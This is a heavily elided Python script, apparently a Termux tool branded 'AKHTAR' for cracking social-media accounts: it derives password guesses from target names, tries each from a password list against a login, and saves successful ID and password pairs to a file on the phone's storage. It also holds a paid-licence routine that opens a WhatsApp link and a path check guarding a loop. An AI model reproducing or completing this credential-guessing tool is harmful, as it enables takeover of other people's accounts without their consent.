...
def qsbuy():
        try:
                ...
                if str("upppdate") in update:
                        ...
                        os.system(f"termux-open-url https://wa.me/+923097025529?text={bumper}")
                        qsbuy()
...
class crack_main():
        ...
        def m1(self,iid,name,passlist):
                try:
                        ...
                        sys.stdout.write('\r[AKHTAR] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                        fn = name.split(' ')[0]
                        try:
                                ln = name.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in po:
                                        print(' \033[1;32m[AKHTAR-OK] '+roid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/AKHTAR_ok.txt','a').write(roid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
...
datar = []
datar.append(pat)
if '/data/data/com.termux/files/home/AKHTAR' in datar:
        pass
else:
        for i in range(5000):
